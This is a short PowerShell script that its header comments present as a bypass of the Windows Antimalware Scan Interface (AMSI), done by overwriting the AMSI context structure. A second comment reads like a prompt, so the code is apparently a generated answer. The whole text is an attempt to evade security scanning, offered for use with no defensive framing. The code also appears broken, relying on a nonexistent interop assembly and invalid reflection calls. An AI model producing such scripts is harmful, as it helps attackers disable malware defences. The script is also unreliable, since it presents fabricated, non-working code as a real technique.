#Bypass AMSI by overwriting AMSI context structure during AmsiInitialize routine
#Output the script in powershell

$amsiContextAddress = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(0x20)
[System.Runtime.InteropServices.Marshal]::WriteInt64($amsiContextAddress,0x0)
[System.Runtime.InteropServices.Marshal]::WriteInt64($amsiContextAddress,0x0,0x8)
[System.Runtime.InteropServices.Marshal]::WriteInt32($amsiContextAddress,0x10,0x0)
[System.Runtime.InteropServices.Marshal]::WriteInt32($amsiContextAddress,0x14,0x0)
[System.Runtime.InteropServices.Marshal]::WriteInt32($amsiContextAddress,0x18,0x0)
[System.Runtime.InteropServices.Marshal]::WriteInt32($amsiContextAddress,0x1C,0x0)
[Reflection.Assembly]::LoadWithPartialName('Microsoft.AMSI.Interop').GetType('Microsoft.AMSI.Interop.AmsiInitialize').Invoke('Microsoft.AMSI.Interop.AmsiContext',$amsiContextAddress)
